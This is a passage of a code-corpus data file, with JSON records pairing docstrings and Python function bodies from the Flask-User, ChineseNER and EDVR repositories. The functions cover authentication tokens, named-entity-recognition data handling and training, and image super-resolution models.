{"docstring": "\"\"\" Convert a list of integers or strings, specified by ``*args``, into an encrypted, timestamped, and signed token.\n\nNote: strings may not contain any ``'|'`` characters, nor start with a ``'~'`` character\nas these are used as separators and integer indicators for encoding.\n\nExample:\n\n::\n\n    # Combine User ID with last 8 bytes of their password\n    # to invalidate tokens when passwords change.\n    user_id = user.id\n    password_ends_with = user.password[-8:0]\n    token = token_manager.generate_token(user_id, password_ends_with)\n\"\"\"\n", "func_signal": "def generate_token(self, *args):\n", "code": "concatenated_str = self.encode_data_items(*args)\ntoken = self.encrypt_string(concatenated_str)\nreturn token", "path": "Flask-User/flask_user/token_manager.py", "commit_date": "2018-03-27 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Allows users to send invitations to register an account \"\"\"\n\n", "func_signal": "def invite_user_view(self):\n", "code": "invite_user_form = self.InviteUserFormClass(request.form)\n\nif request.method == 'POST' and invite_user_form.validate():\n    # Find User and UserEmail by email\n    email = invite_user_form.email.data\n    user, user_email = self.db_manager.get_user_and_user_email_by_email(email)\n    if user:\n        flash(\"User with that email has already registered\", \"error\")\n        return redirect(url_for('user.invite_user'))\n\n    # Add UserInvitation\n    user_invitation = self.db_manager.add_user_invitation(\n        email=email,\n        invited_by_user_id=current_user.id)\n    self.db_manager.commit()\n\n    try:\n        # Send invite_user email\n        self.email_manager.send_invite_user_email(current_user, user_invitation)\n    except Exception as e:\n        # delete new UserInvitation object if send fails\n        self.db_manager.delete_object(user_invitation)\n        self.db_manager.commit()\n        raise\n\n    # Send sent_invitation signal\n    signals \\\n        .user_sent_invitation \\\n        .send(current_app._get_current_object(), user_invitation=user_invitation,\n              form=invite_user_form)\n\n    # Flash a system message\n    flash(_('Invitation has been sent.'), 'success')\n\n    # Redirect\n    safe_next_url = self._get_safe_next_url('next', self.USER_AFTER_INVITE_ENDPOINT)\n    return redirect(safe_next_url)\n\nself.prepare_domain_translations()\nreturn render_template(self.USER_INVITE_USER_TEMPLATE, form=invite_user_form)", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "\"\"\" Prepare a Flash message and redirect to USER_UNAUTHORIZED_ENDPOINT\"\"\"\n# Prepare Flash message\n", "func_signal": "def unauthorized_view(self):\n", "code": "url = request.script_root + request.path\nflash(_(\"You do not have permission to access '%(url)s'.\", url=url), 'error')\n\n# Redirect to USER_UNAUTHORIZED_ENDPOINT\nreturn redirect(self._endpoint_url(self.USER_UNAUTHORIZED_ENDPOINT))", "path": "Flask-User/flask_user/user_manager__views.py", "commit_date": "2019-11-30 00:00:00", "repo_name": "lingthio/Flask-User", "stars": 1041, "license": "mit", "language": "python", "size": 2948}
{"docstring": "# check if a chunk ended between the previous and current word\n# arguments: previous and current chunk tags, previous and current types\n", "func_signal": "def end_of_chunk(prev_tag, tag, prev_type, type_):\n", "code": "chunk_end = False\n\nif prev_tag == 'E': chunk_end = True\nif prev_tag == 'S': chunk_end = True\n\nif prev_tag == 'B' and tag == 'B': chunk_end = True\nif prev_tag == 'B' and tag == 'S': chunk_end = True\nif prev_tag == 'B' and tag == 'O': chunk_end = True\nif prev_tag == 'I' and tag == 'B': chunk_end = True\nif prev_tag == 'I' and tag == 'S': chunk_end = True\nif prev_tag == 'I' and tag == 'O': chunk_end = True\n\nif prev_tag != 'O' and prev_tag != '.' and prev_type != type_:\n    chunk_end = True\n\n# these chunks are assumed to have length 1\nif prev_tag == ']': chunk_end = True\nif prev_tag == '[': chunk_end = True\n\nreturn chunk_end", "path": "ChineseNER/conlleval.py", "commit_date": "2017-07-04 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nTake sentence data and return an input for\nthe training or the evaluation function.\n\"\"\"\n", "func_signal": "def input_from_line(line, char_to_id):\n", "code": "line = full_to_half(line)\nline = replace_html(line)\ninputs = list()\ninputs.append([line])\nline.replace(\" \", \"$\")\ninputs.append([[char_to_id[char] if char in char_to_id else char_to_id[\"<UNK>\"]\n               for char in line]])\ninputs.append([get_seg_features(line)])\ninputs.append([[]])\nreturn inputs", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nReplace singletons by the unknown word with a probability p.\n\"\"\"\n", "func_signal": "def insert_singletons(words, singletons, p=0.5):\n", "code": "new_words = []\nfor word in words:\n    if word in singletons and np.random.uniform() < p:\n        new_words.append(0)\n    else:\n        new_words.append(word)\nreturn new_words", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nMake folders for training and evaluation\n\"\"\"\n", "func_signal": "def make_path(params):\n", "code": "if not os.path.isdir(params.result_path):\n    os.makedirs(params.result_path)\nif not os.path.isdir(params.ckpt_path):\n    os.makedirs(params.ckpt_path)\nif not os.path.isdir(\"log\"):\n    os.makedirs(\"log\")", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nIOB -> IOBES\n\"\"\"\n", "func_signal": "def iob_iobes(tags):\n", "code": "new_tags = []\nfor i, tag in enumerate(tags):\n    if tag == 'O':\n        new_tags.append(tag)\n    elif tag.split('-')[0] == 'B':\n        if i + 1 != len(tags) and \\\n           tags[i + 1].split('-')[0] == 'I':\n            new_tags.append(tag)\n        else:\n            new_tags.append(tag.replace('B-', 'S-'))\n    elif tag.split('-')[0] == 'I':\n        if i + 1 < len(tags) and \\\n                tags[i + 1].split('-')[0] == 'I':\n            new_tags.append(tag)\n        else:\n            new_tags.append(tag.replace('I-', 'E-'))\n    else:\n        raise Exception('Invalid IOB format!')\nreturn new_tags", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "# create model, reuse parameters if exists\n", "func_signal": "def create_model(session, Model_class, path, load_vec, config, id_to_char, logger):\n", "code": "model = Model_class(config)\n\nckpt = tf.train.get_checkpoint_state(path)\nif ckpt and tf.train.checkpoint_exists(ckpt.model_checkpoint_path):\n    logger.info(\"Reading model parameters from %s\" % ckpt.model_checkpoint_path)\n    model.saver.restore(session, ckpt.model_checkpoint_path)\nelse:\n    logger.info(\"Created model with fresh parameters.\")\n    session.run(tf.global_variables_initializer())\n    if config[\"pre_emb\"]:\n        emb_weights = session.run(model.char_lookup.read_value())\n        emb_weights = load_vec(config[\"emb_file\"],id_to_char, config[\"char_dim\"], emb_weights)\n        session.run(model.char_lookup.assign(emb_weights))\n        logger.info(\"Load pre-trained embedding.\")\nreturn model", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "# load data sets\n", "func_signal": "def train():\n", "code": "train_sentences = load_sentences(FLAGS.train_file, FLAGS.lower, FLAGS.zeros)\ndev_sentences = load_sentences(FLAGS.dev_file, FLAGS.lower, FLAGS.zeros)\ntest_sentences = load_sentences(FLAGS.test_file, FLAGS.lower, FLAGS.zeros)\n\n# Use selected tagging scheme (IOB / IOBES)\nupdate_tag_scheme(train_sentences, FLAGS.tag_schema)\nupdate_tag_scheme(test_sentences, FLAGS.tag_schema)\n\n# create maps if not exist\nif not os.path.isfile(FLAGS.map_file):\n    # create dictionary for word\n    if FLAGS.pre_emb:\n        dico_chars_train = char_mapping(train_sentences, FLAGS.lower)[0]\n        dico_chars, char_to_id, id_to_char = augment_with_pretrained(\n            dico_chars_train.copy(),\n            FLAGS.emb_file,\n            list(itertools.chain.from_iterable(\n                [[w[0] for w in s] for s in test_sentences])\n            )\n        )\n    else:\n        _c, char_to_id, id_to_char = char_mapping(train_sentences, FLAGS.lower)\n\n    # Create a dictionary and a mapping for tags\n    _t, tag_to_id, id_to_tag = tag_mapping(train_sentences)\n    with open(FLAGS.map_file, \"wb\") as f:\n        pickle.dump([char_to_id, id_to_char, tag_to_id, id_to_tag], f)\nelse:\n    with open(FLAGS.map_file, \"rb\") as f:\n        char_to_id, id_to_char, tag_to_id, id_to_tag = pickle.load(f)\n\n# prepare data, get a collection of list containing index\ntrain_data = prepare_dataset(\n    train_sentences, char_to_id, tag_to_id, FLAGS.lower\n)\ndev_data = prepare_dataset(\n    dev_sentences, char_to_id, tag_to_id, FLAGS.lower\n)\ntest_data = prepare_dataset(\n    test_sentences, char_to_id, tag_to_id, FLAGS.lower\n)\nprint(\"%i / %i / %i sentences in train / dev / test.\" % (\n    len(train_data), 0, len(test_data)))\n\ntrain_manager = BatchManager(train_data, FLAGS.batch_size)\ndev_manager = BatchManager(dev_data, 100)\ntest_manager = BatchManager(test_data, 100)\n# make path for store log and model if not exist\nmake_path(FLAGS)\nif os.path.isfile(FLAGS.config_file):\n    config = load_config(FLAGS.config_file)\nelse:\n    config = config_model(char_to_id, tag_to_id)\n    save_config(config, FLAGS.config_file)\nmake_path(FLAGS)\n\nlog_path = os.path.join(\"log\", FLAGS.log_file)\nlogger = get_logger(log_path)\nprint_config(config, logger)\n\n# limit GPU memory\ntf_config = tf.ConfigProto()\ntf_config.gpu_options.allow_growth = True\nsteps_per_epoch = train_manager.len_data\nwith tf.Session(config=tf_config) as sess:\n    model = create_model(sess, Model, FLAGS.ckpt_path, load_word2vec, config, id_to_char, logger)\n    logger.info(\"start training\")\n    loss = []\n    for i in range(100):\n        for batch in train_manager.iter_batch(shuffle=True):\n            step, batch_loss = model.run_step(sess, True, batch)\n            loss.append(batch_loss)\n            if step % FLAGS.steps_check == 0:\n                iteration = step // steps_per_epoch + 1\n                logger.info(\"iteration:{} step:{}/{}, \"\n                            \"NER loss:{:>9.6f}\".format(\n                    iteration, step%steps_per_epoch, steps_per_epoch, np.mean(loss)))\n                loss = []\n\n        best = evaluate(sess, model, \"dev\", dev_manager, id_to_tag, logger)\n        if best:\n            save_model(sess, model, FLAGS.ckpt_path, logger)\n        evaluate(sess, model, \"test\", test_manager, id_to_tag, logger)", "path": "ChineseNER/main.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nRun perl script to evaluate model\n\"\"\"\n", "func_signal": "def test_ner(results, path):\n", "code": "output_file = os.path.join(path, \"ner_predict.utf8\")\nwith open(output_file, \"w\") as f:\n    to_write = []\n    for block in results:\n        for line in block:\n            to_write.append(line + \"\\n\")\n        to_write.append(\"\\n\")\n\n    f.writelines(to_write)\neval_lines = return_report(output_file)\nreturn eval_lines", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nCreate a dictionary of items from a list of list of items.\n\"\"\"\n", "func_signal": "def create_dico(item_list):\n", "code": "assert type(item_list) is list\ndico = {}\nfor items in item_list:\n    for item in items:\n        if item not in dico:\n            dico[item] = 1\n        else:\n            dico[item] += 1\nreturn dico", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "# check if a chunk started between the previous and current word\n# arguments: previous and current chunk tags, previous and current types\n", "func_signal": "def start_of_chunk(prev_tag, tag, prev_type, type_):\n", "code": "chunk_start = False\n\nif tag == 'B': chunk_start = True\nif tag == 'S': chunk_start = True\n\nif prev_tag == 'E' and tag == 'E': chunk_start = True\nif prev_tag == 'E' and tag == 'I': chunk_start = True\nif prev_tag == 'S' and tag == 'E': chunk_start = True\nif prev_tag == 'S' and tag == 'I': chunk_start = True\nif prev_tag == 'O' and tag == 'E': chunk_start = True\nif prev_tag == 'O' and tag == 'I': chunk_start = True\n\nif tag != 'O' and tag != '.' and prev_type != type_:\n    chunk_start = True\n\n# these chunks are assumed to have length 1\nif tag == '[': chunk_start = True\nif tag == ']': chunk_start = True\n\nreturn chunk_start", "path": "ChineseNER/conlleval.py", "commit_date": "2017-07-04 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nConvert full-width character to half-width one \n\"\"\"\n", "func_signal": "def full_to_half(s):\n", "code": "n = []\nfor char in s:\n    num = ord(char)\n    if num == 0x3000:\n        num = 32\n    elif 0xFF01 <= num <= 0xFF5E:\n        num -= 0xfee0\n    char = chr(num)\n    n.append(char)\nreturn ''.join(n)", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nConvert conll data to text\n\"\"\"\n", "func_signal": "def convert_to_text(line):\n", "code": "to_print = []\nfor item in line:\n\n    try:\n        if item[0] == \" \":\n            to_print.append(\" \")\n            continue\n        word, gold, tag = item.split(\" \")\n        if tag[0] in \"SB\":\n            to_print.append(\"[\")\n        to_print.append(word)\n        if tag[0] in \"SE\":\n            to_print.append(\"@\" + tag.split(\"-\")[-1])\n            to_print.append(\"]\")\n    except:\n        print(list(item))\nreturn \"\".join(to_print)", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nTake sentence data and return an input for\nthe training or the evaluation function.\n\"\"\"\n", "func_signal": "def create_input(data):\n", "code": "inputs = list()\ninputs.append(data['chars'])\ninputs.append(data[\"segs\"])\ninputs.append(data['tags'])\nreturn inputs", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nCheck that tags have a valid IOB format.\nTags in IOB1 format are converted to IOB2.\n\"\"\"\n", "func_signal": "def iob2(tags):\n", "code": "for i, tag in enumerate(tags):\n    if tag == 'O':\n        continue\n    split = tag.split('-')\n    if len(split) != 2 or split[0] not in ['I', 'B']:\n        return False\n    if split[0] == 'B':\n        continue\n    elif i == 0 or tags[i - 1] == 'O':  # conversion IOB1 to IOB2\n        tags[i] = 'B' + tag[1:]\n    elif tags[i - 1][1:] == tag[1:]:\n        continue\n    else:  # conversion IOB1 to IOB2\n        tags[i] = 'B' + tag[1:]\nreturn True", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nSave configuration of the model\nparameters are stored in json format\n\"\"\"\n", "func_signal": "def save_config(config, config_file):\n", "code": "with open(config_file, \"w\", encoding=\"utf8\") as f:\n    json.dump(config, f, ensure_ascii=False, indent=4)", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nIOBES -> IOB\n\"\"\"\n", "func_signal": "def iobes_iob(tags):\n", "code": "new_tags = []\nfor i, tag in enumerate(tags):\n    if tag.split('-')[0] == 'B':\n        new_tags.append(tag)\n    elif tag.split('-')[0] == 'I':\n        new_tags.append(tag)\n    elif tag.split('-')[0] == 'S':\n        new_tags.append(tag.replace('S-', 'B-'))\n    elif tag.split('-')[0] == 'E':\n        new_tags.append(tag.replace('E-', 'I-'))\n    elif tag.split('-')[0] == 'O':\n        new_tags.append(tag)\n    else:\n        raise Exception('Invalid format!')\nreturn new_tags", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nLoad configuration of the model\nparameters are stored in json format\n\"\"\"\n", "func_signal": "def load_config(config_file):\n", "code": "with open(config_file, encoding=\"utf8\") as f:\n    return json.load(f)", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nCut text to sentences \n\"\"\"\n", "func_signal": "def cut_to_sentence(text):\n", "code": "sentence = []\nsentences = []\nlen_p = len(text)\npre_cut = False\nfor idx, word in enumerate(text):\n    sentence.append(word)\n    cut = False\n    if pre_cut:\n        cut=True\n        pre_cut=False\n    if word in u\"\u3002;!?\\n\":\n        cut = True\n        if len_p > idx+1:\n            if text[idx+1] in \".\u3002\u201d\\\"\\'\u201c\u201d\u2018\u2019?!\":\n                cut = False\n                pre_cut=True\n\n    if cut:\n        sentences.append(sentence)\n        sentence = []\nif sentence:\n    sentences.append(\"\".join(list(sentence)))\nreturn sentences", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nCreate a mapping (item to ID / ID to item) from a dictionary.\nItems are ordered by decreasing frequency.\n\"\"\"\n", "func_signal": "def create_mapping(dico):\n", "code": "sorted_items = sorted(dico.items(), key=lambda x: (-x[1], x[0]))\nid_to_item = {i: v[0] for i, v in enumerate(sorted_items)}\nitem_to_id = {v: k for k, v in id_to_item.items()}\nreturn item_to_id, id_to_item", "path": "ChineseNER/data_utils.py", "commit_date": "2017-07-10 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"\nClean current folder\nremove saved model and training log\n\"\"\"\n", "func_signal": "def clean(params):\n", "code": "if os.path.isfile(params.vocab_file):\n    os.remove(params.vocab_file)\n\nif os.path.isfile(params.map_file):\n    os.remove(params.map_file)\n\nif os.path.isdir(params.ckpt_path):\n    shutil.rmtree(params.ckpt_path)\n\nif os.path.isdir(params.summary_path):\n    shutil.rmtree(params.summary_path)\n\nif os.path.isdir(params.result_path):\n    shutil.rmtree(params.result_path)\n\nif os.path.isdir(\"log\"):\n    shutil.rmtree(\"log\")\n\nif os.path.isdir(\"__pycache__\"):\n    shutil.rmtree(\"__pycache__\")\n\nif os.path.isfile(params.config_file):\n    os.remove(params.config_file)\n\nif os.path.isfile(params.vocab_file):\n    os.remove(params.vocab_file)", "path": "ChineseNER/utils.py", "commit_date": "2017-07-12 00:00:00", "repo_name": "zjy-ucas/ChineseNER", "stars": 1758, "license": "None", "language": "python", "size": 15120}
{"docstring": "\"\"\"Get Inception feature maps.\n\nArgs:\n    x (Tensor): Input tensor of shape (b, 3, h, w).\n        Values are expected to be in range (-1, 1). You can also input\n        (0, 1) with setting normalize_input = True.\n\nReturns:\n    list[Tensor]: Corresponding to the selected output block, sorted\n    ascending by index.\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "output = []\n\nif self.resize_input:\n    x = F.interpolate(\n        x, size=(299, 299), mode='bilinear', align_corners=False)\n\nif self.normalize_input:\n    x = 2 * x - 1  # Scale from range (0, 1) to range (-1, 1)\n\nfor idx, block in enumerate(self.blocks):\n    x = block(x)\n    if idx in self.output_blocks:\n        output.append(x)\n\n    if idx == self.last_needed_block:\n        break\n\nreturn output", "path": "EDVR/basicsr/models/archs/inception.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"get the image data and update pbar.\"\"\"\n", "func_signal": "def callback(arg):\n", "code": "key, dataset[key], shapes[key] = arg\npbar.update(1)\npbar.set_description(f'Read {key}')", "path": "EDVR/basicsr/utils/lmdb_util.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "# optimize net_g\n", "func_signal": "def optimize_parameters(self, current_iter):\n", "code": "for p in self.net_d.parameters():\n    p.requires_grad = False\n\nself.optimizer_g.zero_grad()\nself.output = self.net_g(self.lq)\n\nl_g_total = 0\nloss_dict = OrderedDict()\nif (current_iter % self.net_d_iters == 0\n        and current_iter > self.net_d_init_iters):\n    # pixel loss\n    if self.cri_pix:\n        l_g_pix = self.cri_pix(self.output, self.gt)\n        l_g_total += l_g_pix\n        loss_dict['l_g_pix'] = l_g_pix\n    # perceptual loss\n    if self.cri_perceptual:\n        l_g_percep, l_g_style = self.cri_perceptual(\n            self.output, self.gt)\n        if l_g_percep is not None:\n            l_g_total += l_g_percep\n            loss_dict['l_g_percep'] = l_g_percep\n        if l_g_style is not None:\n            l_g_total += l_g_style\n            loss_dict['l_g_style'] = l_g_style\n    # gan loss (relativistic gan)\n    real_d_pred = self.net_d(self.gt).detach()\n    fake_g_pred = self.net_d(self.output)\n    l_g_real = self.cri_gan(\n        real_d_pred - torch.mean(fake_g_pred), False, is_disc=False)\n    l_g_fake = self.cri_gan(\n        fake_g_pred - torch.mean(real_d_pred), True, is_disc=False)\n    l_g_gan = (l_g_real + l_g_fake) / 2\n\n    l_g_total += l_g_gan\n    loss_dict['l_g_gan'] = l_g_gan\n\n    l_g_total.backward()\n    self.optimizer_g.step()\n\n# optimize net_d\nfor p in self.net_d.parameters():\n    p.requires_grad = True\n\nself.optimizer_d.zero_grad()\n# gan loss (relativistic gan)\n\n# In order to avoid the error in distributed training:\n# \"Error detected in CudnnBatchNormBackward: RuntimeError: one of\n# the variables needed for gradient computation has been modified by\n# an inplace operation\",\n# we separate the backwards for real and fake, and also detach the\n# tensor for calculating mean.\n\n# real\nfake_d_pred = self.net_d(self.output).detach()\nreal_d_pred = self.net_d(self.gt)\nl_d_real = self.cri_gan(\n    real_d_pred - torch.mean(fake_d_pred), True, is_disc=True) * 0.5\nl_d_real.backward()\n# fake\nfake_d_pred = self.net_d(self.output.detach())\nl_d_fake = self.cri_gan(\n    fake_d_pred - torch.mean(real_d_pred.detach()),\n    False,\n    is_disc=True) * 0.5\nl_d_fake.backward()\nself.optimizer_d.step()\n\nloss_dict['l_d_real'] = l_d_real\nloss_dict['l_d_fake'] = l_d_fake\nloss_dict['out_d_real'] = torch.mean(real_d_pred.detach())\nloss_dict['out_d_fake'] = torch.mean(fake_d_pred.detach())\n\nself.log_dict = self.reduce_loss_dict(loss_dict)", "path": "EDVR/basicsr/models/esrgan_model.py", "commit_date": "2020-08-31 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Change to Y channel of YCbCr.\n\nArgs:\n    img (ndarray): Images with range [0, 255].\n\nReturns:\n    (ndarray): Images with range [0, 255] (float type) without round.\n\"\"\"\n", "func_signal": "def to_y_channel(img):\n", "code": "img = img.astype(np.float32) / 255.\nif img.ndim == 3 and img.shape[2] == 3:\n    img = bgr2ycbcr(img, y_only=True)\n    img = img[..., None]\nreturn img * 255.", "path": "EDVR/basicsr/metrics/metric_util.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Reorder images to 'HWC' order.\n\nIf the input_order is (h, w), return (h, w, 1);\nIf the input_order is (c, h, w), return (h, w, c);\nIf the input_order is (h, w, c), return as it is.\n\nArgs:\n    img (ndarray): Input image.\n    input_order (str): Whether the input order is 'HWC' or 'CHW'.\n        If the input image shape is (h, w), input_order will not have\n        effects. Default: 'HWC'.\n\nReturns:\n    ndarray: reordered image.\n\"\"\"\n\n", "func_signal": "def reorder_image(img, input_order='HWC'):\n", "code": "if input_order not in ['HWC', 'CHW']:\n    raise ValueError(\n        f'Wrong input_order {input_order}. Supported input_orders are '\n        \"'HWC' and 'CHW'\")\nif len(img.shape) == 2:\n    img = img[..., None]\nif input_order == 'CHW':\n    img = img.transpose(1, 2, 0)\nreturn img", "path": "EDVR/basicsr/metrics/metric_util.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Test reds dataset.\n\nArgs:\n    mode: There are two modes: 'lmdb', 'folder'.\n\"\"\"\n", "func_signal": "def main(mode='folder'):\n", "code": "opt = {}\nopt['dist'] = False\nopt['phase'] = 'train'\n\nopt['name'] = 'REDS'\nopt['type'] = 'REDSDataset'\nif mode == 'folder':\n    opt['dataroot_gt'] = 'datasets/REDS/train_sharp'\n    opt['dataroot_lq'] = 'datasets/REDS/train_sharp_bicubic'\n    opt['dataroot_flow'] = None\n    opt['meta_info_file'] = 'basicsr/data/meta_info/meta_info_REDS_GT.txt'\n    opt['io_backend'] = dict(type='disk')\nelif mode == 'lmdb':\n    opt['dataroot_gt'] = 'datasets/REDS/train_sharp_with_val.lmdb'\n    opt['dataroot_lq'] = 'datasets/REDS/train_sharp_bicubic_with_val.lmdb'\n    opt['dataroot_flow'] = None\n    opt['meta_info_file'] = 'basicsr/data/meta_info/meta_info_REDS_GT.txt'\n    opt['io_backend'] = dict(type='lmdb')\n\nopt['val_partition'] = 'REDS4'\nopt['num_frame'] = 5\nopt['gt_size'] = 256\nopt['interval_list'] = [1]\nopt['random_reverse'] = True\nopt['use_flip'] = True\nopt['use_rot'] = True\n\nopt['use_shuffle'] = True\nopt['num_worker_per_gpu'] = 1\nopt['batch_size_per_gpu'] = 16\nopt['scale'] = 4\n\nopt['dataset_enlarge_ratio'] = 1\n\nos.makedirs('tmp', exist_ok=True)\n\ndataset = create_dataset(opt)\ndata_loader = create_dataloader(\n    dataset, opt, num_gpu=0, dist=opt['dist'], sampler=None)\n\nnrow = int(math.sqrt(opt['batch_size_per_gpu']))\npadding = 2 if opt['phase'] == 'train' else 0\n\nprint('start...')\nfor i, data in enumerate(data_loader):\n    if i > 5:\n        break\n    print(i)\n\n    lq = data['lq']\n    gt = data['gt']\n    key = data['key']\n    print(key)\n    for j in range(opt['num_frame']):\n        torchvision.utils.save_image(\n            lq[:, j, :, :, :],\n            f'tmp/lq_{i:03d}_frame{j}.png',\n            nrow=nrow,\n            padding=padding,\n            normalize=False)\n    torchvision.utils.save_image(\n        gt,\n        f'tmp/gt_{i:03d}.png',\n        nrow=nrow,\n        padding=padding,\n        normalize=False)", "path": "EDVR/tests/test_reds_dataset.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Quantize flow to [0, 255].\n\nAfter this step, the size of flow will be much smaller, and can be\ndumped as jpeg images.\n\nArgs:\n    flow (ndarray): (h, w, 2) array of optical flow.\n    max_val (float): Maximum value of flow, values beyond\n                    [-max_val, max_val] will be truncated.\n    norm (bool): Whether to divide flow values by image width/height.\n\nReturns:\n    tuple[ndarray]: Quantized dx and dy.\n\"\"\"\n", "func_signal": "def quantize_flow(flow, max_val=0.02, norm=True):\n", "code": "h, w, _ = flow.shape\ndx = flow[..., 0]\ndy = flow[..., 1]\nif norm:\n    dx = dx / w  # avoid inplace operations\n    dy = dy / h\n# use 255 levels instead of 256 to make sure 0 is 0 after dequantization.\nflow_comps = [\n    quantize(d, -max_val, max_val, 255, np.uint8) for d in [dx, dy]\n]\nreturn tuple(flow_comps)", "path": "EDVR/basicsr/utils/flow_util.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Dynamically instantiate class.\n\nArgs:\n    modules (list[importlib modules]): List of modules from importlib\n        files.\n    cls_type (str): Class type.\n    opt (dict): Class initialization kwargs.\n\nReturns:\n    class: Instantiated class.\n\"\"\"\n\n", "func_signal": "def dynamic_instantiation(modules, cls_type, opt):\n", "code": "for module in modules:\n    cls_ = getattr(module, cls_type, None)\n    if cls_ is not None:\n        break\nif cls_ is None:\n    raise ValueError(f'{cls_type} is not found.')\nreturn cls_(**opt)", "path": "EDVR/basicsr/models/archs/__init__.py", "commit_date": "2020-10-03 00:00:00", "repo_name": "xinntao/EDVR", "stars": 1457, "license": "None", "language": "python", "size": 2562}
{"docstring": "\"\"\"Create a weighted version of a given loss function.\n\nTo use this decorator, the loss function must have the signature like\n`loss_func(pred, target, **kwargs)`. The function only needs to compute\nelement-wise loss without any reduction. This decorator will add weight\nand reduction arguments to the function. The decorated function will have\nthe signature like `loss_func(pred, target, weight=None, reduction='mean',\n**kwargs)`.\n\n:Example:\n\n>>> import torch\n>>> @weighted_loss\n>>> def l1_loss(pred, target):\n>>>     return (pred - target).abs()\n\n>>> pred = torch.Tensor([0, 2, 3])\n>>> target = torch.Tensor([1, 1, 1])\n>>> weight = torch.Tensor([1, 0, 1])\n\n>>> l1_loss(pred, target)\ntensor(1.3333)\n>>> l1_loss(pred, target, weight)\ntensor(1.5000)\n>>> l1_loss(pred, target, reduction='none')\ntensor([1., 1., 2.])\n>>> l1_loss(pred, target, weight, reduction='sum')\ntensor(3.)\n\"\"\"\n\n", "func_signal": "def weighted_loss(loss_func):\n", "code": "@functools.wraps(loss_func)\ndef wrapper(pred, target, weight=None, reduction='mean', **kwargs):\n    # get element-wise loss\n    loss = loss_func(pred, target, **kwargs)\n    loss = weight_reduce_loss(loss, weight, reduction)\n    return loss\n\nreturn wrapper", "path": "EDVR/basicsr/models/losses/loss_util.py", "commit_date": 